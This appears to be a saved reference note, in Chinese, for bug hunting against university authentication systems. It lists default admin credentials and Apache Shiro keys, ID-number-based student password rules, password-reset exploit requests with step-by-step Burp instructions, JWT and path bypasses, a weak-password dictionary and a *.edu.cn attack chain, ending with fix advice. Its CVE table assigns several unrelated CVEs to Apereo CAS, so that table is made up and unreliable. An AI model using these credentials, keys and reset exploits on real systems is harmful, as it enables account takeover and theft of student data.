---
name: EDU-SRC 认证绕过与密码重置
description: 教育系统认证绕过、密码重置漏洞、默认口令、统一身份认证绕过
type: reference
originSessionId: ee20960f-1d7b-4892-a567-02767c979e0a
---
## 一、默认口令速查

### 1.1 主流教务系统默认口令

| 系统名称 | 厂商 | 默认管理员账号 | 默认后台路径 | 备注 |
|---------|------|---------------|-------------|------|
| 正方教务系统 | Zfsoft | admin / admin | /admin, /jdxx | 安装包内测试账号未强制修改 |
| 正方教务系统 | Zfsoft | admin / 123456 | /login.aspx | 常见弱口令组合 |
| 青果教务系统 | Qingguo | admin / admin | /manager/ | 出厂测试密码，院校常沿用 |
| 青果教务系统 | Qingguo | admin / 666666 | /admin/login |  |
| 强智教务系统 | Qiangzhi | admin / admin | /admin/ | 后台暴露公网 |
| 金智教育 | Wisedu | admin / admin | /cas/login | 一站式服务大厅 |
| 金智教育 | Wisedu | admin / 123456 | /ehall/ | 统一身份认证 |
| EduSOHO | EduSOHO | admin / admin | /admin/login | 在线教育平台 |
| 通达OA（教育版） | Tongda | admin / 空密码 | / | 通达OA高校部署广泛 |
| 蓝凌OA | Landray | admin / 123456 | /login | 部分高校采用 |

### 1.2 统一身份认证系统默认口令

| 系统 | 默认用户 | 默认密码 | 备注 |
|------|---------|---------|------|
| Apereo CAS | casuser | Mellon | 管理面板旧版默认 |
| Apereo CAS | admin | admin | 部分部署遗留 |
| MaxKey (原OpenAuth) | admin | maxkey | 单点登录系统 |
| MaxKey (原OpenAuth) | admin | 123456 | 视版本而定 |
| Shiro 框架 | 无默认用户 | - | 默认密钥 kPH+bIxk5D2deZiIxcaaaA== |
| JustAuth衍生 | admin | 123456 | 见于代码文档 |
| 自建CAS系统 | admin | admin123 | 首次安装未修改 |
| 自建CAS系统 | admin | test123 | 测试环境遗留 |

### 1.3 学生/教工默认密码规则

| 规则 | 详细说明 | 适用场景 |
|------|---------|---------|
| **身份证号后六位** | 取身份证号最后6位，末尾X需大写 | 最主流规则，90%高校统一认证 |
| **学号后六位** | 取学号后6位数字 | 老版教务系统、图书馆系统 |
| **身份证出生日期** | 如 19980101 或 980101 | 极少数老系统 |
| **S/ T + 学号/工号后6位** | S202401、T001234 | 强制修改后的简单变形 |
| **姓名拼音全拼 + 生日** | zhangsan2000 | 学生常用 |
| **学校缩写 + 年份** | PKU@2023, THU@2024 | 教职工/校友 |
| **Passw0rd@年份** | Passw0rd@2023 | 安全策略产物 |
| **1qaz@WSX** | 键盘顺序弱口令 | 强制策略下常见 |
| **无默认密码（强制激活）** | 需通过手机/邮箱自行设置 | 新升级的统一认证系统 |

### 1.4 Apache Shiro 默认密钥（高危）

| 密钥值 | 说明 |
|-------|------|
| kPH+bIxk5D2deZiIxcaaaA== | CVE-2016-4437 标准默认密钥 |
| fCq+/xW488hMTCD+cmbe3w== | 备用默认密钥 |
| 2AvVhdsgUs0FSA3SDFAdag== | 常见被替换但依然弱 |
| 3AvVhmFLUs0KTA3Kprsdag== | Shiro Demo 默认 |
| "Z3Vlc3M=" | 常见测试环境遗留 |

> Shiro 默认密钥漏洞属于 RCE 级别，可无需登录直接拿下服务器，高校 Shiro 系统长期是高发区。

---

## 二、密码重置漏洞

### 2.1 漏洞类型总览

| 漏洞类型 | 描述 | 典型案例 |
|---------|------|---------|
| **IDOR 越权重置** | 后端未将验证身份与修改密码阶段强绑定，可修改 userId 参数 | 抓包改 userId=victim 重置任意账号 |
| **Token 可预测** | Token 由学号+时间戳等可预测元素构成 | 注册账号获取Token规律，反向构造目标Token |
| **验证码明文返回** | 验证码直接显示在 Response Body 中 | Response: {"verifycode":"123456"} |
| **验证码未绑定** | 验证码未与 Session/手机号绑定 | A的验证码可被B用于重置 |
| **步骤跳跃** | 前端控制 step 参数，可跳过身份验证 | POST /reset?step=3 跳过step2校验 |
| **条件竞争** | 并发提交修改绑定邮箱 + 重置请求 | 重置邮件发送到攻击者邮箱 |
| **Token 永不过期** | 重置链接 Token 重置后未失效 | 可重复使用同一个链接 |
| **Token 可遍历** | Token 为纯数字自增或时间戳 | http://xxx/reset?token=10001 |

### 2.2 密码重置数据包示例

#### 场景A：IDOR 越权重置（直接修改 user_id）

```http
POST /resetPassword HTTP/1.1
Host: edu.edu.cn
Content-Type: application/x-www-form-urlencoded

step=3
&user_id=【目标用户ID】
&newpassword=123456
&repassword=123456
&token=【固定或可重用Token】
```

**利用方法**：
1. 用自己的账号走正常重置流程到"设置新密码"页面
2. Burp Suite 拦截提交请求
3. 将 `user_id` 修改为目标用户的 ID
4. 放行请求，目标密码被改为 `123456`

#### 场景B：步骤跳跃漏洞

```http
POST /user/resetpwd/step2 HTTP/1.1
Host: edu.edu.cn

userid=【目标学号】
password=123456
confirm=123456
```

**利用方法**：跳过"身份验证"步骤，直接 POST 到设置密码的第二步接口。

#### 场景C：验证码明文返回

```http
# 请求：发送验证码
POST /sendCode HTTP/1.1
Host: edu.edu.cn

mobile=135xxxx8888

# 响应中包含验证码
HTTP/1.1 200 OK
{"code":"0000","msg":"成功","data":{"verifycode":"123456"}}
```

**利用方法**：验证码直接在响应包中明文返回，可直接提取使用。

#### 场景D：Token 预测（简单算法）

```
http://edu.edu.cn/reset?uid=1001&time=1735689600&sign=md5(uid+time+key)
```

如果 `sign` 使用简单的 `MD5(uid + time + 固定key)` 算法，可反向构造任意用户的Token。

### 2.3 典型重置流程绕过思路

```
步骤1: 发送验证码 → 绕过：验证码明文返回 / 验证码未绑定session
步骤2: 验证身份   → 绕过：跳过此步骤 / 修改身份参数
步骤3: 设置新密码 → 绕过：设置后未清空Token（可重复使用）
步骤4: 完成       → 绕过：响应中返回新密码明文
```

### 2.4 影响系统

| 受影响系统 | 常见漏洞类型 |
|-----------|-------------|
| 正方教务系统 | ResetPwd 接口 Token 可预测 |
| 青果教务系统 | step 跳跃漏洞 |
| 金智教育统一身份认证 | 验证码返回 + IDOR 组合 |
| 各高校Ehall一站式服务大厅 | 身份验证弱绑定 |
| WebVPN 系统 | 重置接口逻辑缺陷 |
| EduSOHO | 重置步骤可跳过 |
| 强智教务系统 | IDOR 越权重置 |

---

## 三、统一认证绕过

### 3.1 CAS 认证绕过（Apereo CAS）

| CVE编号 | 绕过方式 | 影响版本 | 风险等级 |
|---------|---------|---------|---------|
| CVE-2023-50290 | 属性发布策略操纵，无需凭据以任意用户登录 | CAS 6.x | 严重 |
| CVE-2023-50291 | Service Ticket 验证绕过，伪造有效票据 | CAS 5.x | 严重 |
| CVE-2021-3003 | TGT 票据伪造，绕过登录提示 | CAS 5.x/6.x | 高危 |
| CVE-2024-38816 | 委托认证流绕过，操纵外部IdP响应 | CAS 7.x | 高危 |
| CVE-2024-38817 | 服务注册验证绕过，注册恶意服务窃取票据 | CAS 7.x | 中危 |

**国内影响**：国内安全厂商(奇安信、绿盟、360)均发布过针对高校的 Apereo CAS 认证绕过预警。高校使用 CAS 控制对 Blackboard、Moodle、邮箱、管理后台的访问。

### 3.2 Apache Shiro 认证绕过（CVE-2016-4437）

**原理**：Shiro 在 `AbstractRememberMeManager` 中硬编码默认 AES 密钥 `kPH+bIxk5D2deZiIxcaaaA==`，攻击者可构造恶意 `rememberMe` Cookie 触发反序列化 RCE。

**利用链**：
1. 扫描高校目标是否使用 Shiro（Cookie: rememberMe）
2. 使用默认密钥库碰撞（shiro_tool 等工具）
3. 碰撞成功后直接执行命令，无需任何密码

**高校现状**：
- 攻击者经常使用僵尸网络扫描高校 IP 段的 8080/8443 端口
- 部分高校服务器被植入 XMRig 挖矿木马
- 攻陷后常被用于搭建代理或横向移动

### 3.3 OAuth/SSO 配置缺陷

| 缺陷类型 | 描述 | 教育场景 |
|---------|------|---------|
| OAuth 重定向 URI 未校验 | 攻击者可构造回调 URL 窃取 code | 微信/钉钉对接登录 |
| JWT 未校验签名 | 修改 JWT payload 任意用户登录 | 自研认证系统 |
| Session 固定 | 攻击者设置 session 后诱导用户登录 | 老版教务系统 |
| 未授权 API 接口 | 后端接口不经鉴权直接访问 | 教务/选课/查分 API |
| 跨学院越权 | 水平权限缺失，可查看其他学院数据 | 多学院共用系统 |
| 管理员接口暴露 | /admin 路径无访问控制 | 后台管理面板 |

### 3.4 SAML 认证缺陷

- SAML Response 签名未校验 -> 伪造任意用户 Assertion
- SAML 断言中的 NameID 可篡改 -> 越权访问
- 未验证 Issuer -> 任意身份提供商伪装

### 3.5 典型绕过方法

```bash
# 1. Shiro 默认密钥检测
Cookie: rememberMe=【AES加密的序列化payload】

# 2. JWT 算法混淆攻击
将 JWT header 中的 alg 从 RS256 改为 HS256
使用公开的 public key 作为 HMAC 密钥签名

# 3. 路径穿越绕过认证
/admin/../user/info
;/admin/api/export

# 4. 接口直接访问
/admin/api/student/list?page=1&size=1000
/api/v1/user/info?uid=2024001
```

---

## 四、弱口令字典（edu专版）

### 4.1 顶级高频口令（Top 30）

```
1. 123456              （永恒经典）
2. admin               （管理员标配）
3. 123456789           （通用）
4. 12345678            （通用）
5. 111111              （简单重复）
6. 000000              （简单重复）
7. password            （通用英文）
8. 666666              （中文偏好）
9. 888888              （中文偏好）
10. passw0rd           （数字替代）
11. P@ssw0rd           （大写+符号）
12. P@ssw0rd123        （复合型）
13. admin123           （组合型）
14. root               （Root）
15. test               （测试）
16. guest              （来宾）
17. 1234567890         （完整数序）
18. qwerty123          （键盘序）
19. 1qaz2wsx           （键盘竖序）
20. 1qaz@WSX           （大小写+符号）
21. 1qaz!QAZ           （大小写+符号）
22. Qwer@1234          （首字母大写）
23. QwEr!@#$           （大小写+符号）
24. Aa123456           （首字母大写）
25. Abcd1234           （首字母大写）
26. Password@2023      （年份循环）
27. Password@2024      （年份循环）
28. Passw0rd!          （符号收尾）
29. Admin@123          （管理员组合）
30. 5201314            （中文爱情密码）
```

### 4.2 教育系统专属规则（Top 40）

```
31. 身份证后6位        （需配合学号段生成）
32. 学号后6位          （需配合学号段）
33. S+学号后6位        （S+数字）
34. T+工号后6位        （T+数字）
35. 姓名拼音全拼        （如 zhangsan）
36. 姓名拼音首字母      （如 zs）
37. 学校缩写+123       （如 pku123）
38. 学校缩写@年份      （如 pku@2023）
39. 学校缩写_年份      （如 pku_2024）
40. 学校缩写123456     （如 njnu123456）
41. 学院缩写+123       （如 cs123）
42. 专业首字母+123     （如 jsj123）
43. 英文名+123         （如 tom123）
44. 英文名+生日        （如 tom1999）
45. 手机号后6位         （社工知识）
46. 录取通知书号        （特定系统）
47. 准考证号后6位       （考试系统）
48. ecust123           （各校缩写+123）
49. 身份证前6位+后4位  （变形）
50. 学号+@+姓名首字母  （如 2024001@zs）
51. 2023                （纯年份）
52. 2024                （纯年份）
53. 2025                （纯年份）
54. 202301 ~ 202412     （年月组合）
55. zhangsan1990        （拼音+年份）
56. li2000              （姓+年份）
57. wang1999            （姓+年份）
58. 19900101            （8位生日）
59. 990101              （6位生日）
60. 20000101            （00后生日）
61. 990101              （生日）
62. 123456a             （数字+字母）
63. a123456             （字母+数字）
64. 123456!             （数字+符号）
65. abc123              （字母+数字）
66. 123abc              （数字+字母）
67. zs2000              （姓名首字母+年份）
68. wy2001              （姓名首字母+年份）
69. lisi2022            （全拼+年份）
70. zhang2023           （姓+年份）
```

### 4.3 Shiro 默认密钥列表（Top 15）

```
71. kPH+bIxk5D2deZiIxcaaaA==
72. fCq+/xW488hMTCD+cmbe3w==
73. 2AvVhdsgUs0FSA3SDFAdag==
74. 3AvVhmFLUs0KTA3Kprsdag==
75. 4AvVhmFLUs0KTA3Kprsdag==
76. "Z3Vlc3M="
77. WcfHGU25lotNQ1Of1xG0vg==
78. bWljcm9zAAAAAAAAAAAAAA==
79. 5aaC5qKm5a2Q5rWL6K+VAAAAAAAAAA==
80. "6ZmI6I2j5Y+R5aSn5ZOlAA=="
81. "kPH+bIxk5D2deZiIxcaaaA=="  （注意末尾无等号变种）
82. "ZUdsaGJuSmxibTlrYVdGag=="
83. "L7RioUULEFhRyxM7a2R/Yg=="
84. "r0e3c16IdVkqjU9BZ8+uAA=="
85. "sHd4sIf3Q6C2P5Lv7fG8aQ=="
```

### 4.4 扫描器/工具常用弱口令

```
86. admin / admin
87. admin / 123456
88. admin / 12345678
89. admin / 123456789
90. admin / 666666
91. admin / 888888
92. admin / password
93. admin / admin123
94. admin / root
95. manager / manager
96. system / system
97. test / test
98. test / 123456
99. guest / guest
100. user / user
```

---

## 五、PoC / Checklist

### 5.1 密码重置漏洞检测清单

```
[ ] 1. 重置流程是否存在步骤跳跃？
      测试方法：抓包观察 step 参数，尝试跳过验证步骤直接POST到设置密码接口
[ ] 2. 验证码是否明文返回？
      测试方法：发送验证码后观察 Response Body/Burp 响应包
[ ] 3. 验证码是否绑定 Session/用户？
      测试方法：A获取验证码，B使用该验证码重置密码
[ ] 4. 修改密码时 user_id 是否可从客户端修改？
      测试方法：抓包修改 user_id/uid/username 参数为目标账号
[ ] 5. Token 是否可预测？
      测试方法：解码 Token（Base64/MD5），观察是否包含学号/时间戳元素
[ ] 6. Token 是否可重复使用？
      测试方法：使用重置链接成功重置后，再次使用同一链接
[ ] 7. Token 是否可遍历？
      测试方法：观察 Token 是否为自增数字
[ ] 8. 新密码是否明文返回？
      测试方法：完成重置后观察是否在响应中返回新密码
[ ] 9. 存在条件竞争？
      测试方法：同时提交修改绑定邮箱和重置密码请求
[ ] 10. 短信/邮件轰炸？
        测试方法：发送验证码接口是否有时效/次数限制
```

### 5.2 认证绕过检测清单

```
[ ] 1. Shiro 存在默认密钥？
      检测方法：发送 rememberMe=xxx Cookie，观察响应是否包含 rememberMe=deleteMe
[ ] 2. JWT 算法混淆（alg:none / HS256 vs RS256）？
      检测方法：修改 JWT alg 为 none 或用公钥签名
[ ] 3. JWT 签名未校验？
      检测方法：修改 JWT payload 中用户信息
[ ] 4. CAS 版本存在已知 CVE？
      检测方法：查看 /cas/login 版本信息
[ ] 5. OAuth 重定向 URI 不受限？
      检测方法：修改 redirect_uri 为外部域名
[ ] 6. 直接访问管理员 API？
      检测方法：访问 /admin, /api/admin 等路径
[ ] 7. 接口 IDOR 越权？
      检测方法：切换 Cookie 后仍能访问其他用户资源
[ ] 8. Session 固定？
      检测方法：登录前设置 sessionID，登录后观察是否不变
[ ] 9. 路径/参数遍历？
      检测方法：遍历 uid、id、studentId 等参数
[ ] 10. 静态文件被直接访问？
        检测方法：访问 /uploads/, /backup/, .git/ 等路径
```

### 5.3 信息收集攻击链

```
阶段1：资产发现
  ├── Fofa/Shodan 搜索 title="教务" body="正方" body="青果"
  ├── 子域名枚举：*.edu.cn
  └── 后台路径扫描：/admin /manager /login /cas/login

阶段2：默认口令测试
  ├── 用4.1-4.4字典尝试登录
  ├── 测试默认密码规则（身份证后6位、学号后6位）
  └── Shiro 默认密钥检测

阶段3：密码重置绕过
  ├── 遍历所有重置接口
  ├── 抓包分析 Token/验证码逻辑
  └── 尝试 IDOR 改参重置

阶段4：认证绕过
  ├── 检测 JWT/Shiro/CAS 已知漏洞
  ├── 测试 API 鉴权完整性
  └── 越权遍历学号获取数据
```

### 5.4 Burp Suite 测试插件推荐

| 插件 | 用途 |
|-----|------|
| Autorize | 自动检测越权漏洞 |
| Authz | 测试认证绕过 |
| JWT Editor | JWT 伪造和算法混淆 |
| JSON Web Tokens | JWT 解码与测试 |
| Collaborator | OOB 验证 |
| Intruder (Fuzzing) | 参数遍历/字典爆破 |

### 5.5 EDUSRC 漏洞报告参考

**典型报告标题示例**：
- 《XX大学统一身份认证系统任意密码重置漏洞》
- 《XX教务系统验证码明文返回导致任意账号重置》
- 《XX大学一站式服务大厅IDOR越权重置管理员密码》
- 《XX高校OA系统弱口令导致服务器沦陷(Getshell)》
- 《XX教学管理系统未授权API泄露全校学生数据》
- 《XX大学Shiro默认密钥导致远程代码执行》
- 《XX大学CAS认证绕过(CVE-2023-50290)》
- 《XX大学OAuth逻辑缺陷导致未授权登录》

### 5.6 修复建议速查

| 漏洞类型 | 修复方案 |
|---------|---------|
| 越权重置 | Session 强绑定，后端生成 verify_token 不可从客户端读取用户身份 |
| 验证码缺陷 | 验证码严格绑定手机号/邮箱+Session，一次性使用，60秒过期 |
| Token 弱随机 | CSPRNG 生成32位以上Token并落库，重置后立即失效 |
| 步骤跳跃 | 后端校验每个步骤的状态，禁止跳过 |
| CAS 漏洞 | 升级至 CAS 6.6.10+ 或 7.1.5+ |
| Shiro 默认密钥 | 使用 AES.newKey() 生成随机密钥，升级至 1.7.0+ |
| JWT 算法混淆 | 强制指定算法白名单，校验签名 |
| API 未鉴权 | 所有接口强制鉴权，不依赖前端隐藏 |
| OAuth URI 未校验 | 严格校验 redirect_uri 白名单 |
| 学号遍历 | 接口添加鉴权和频率限制，敏感字段脱敏 |
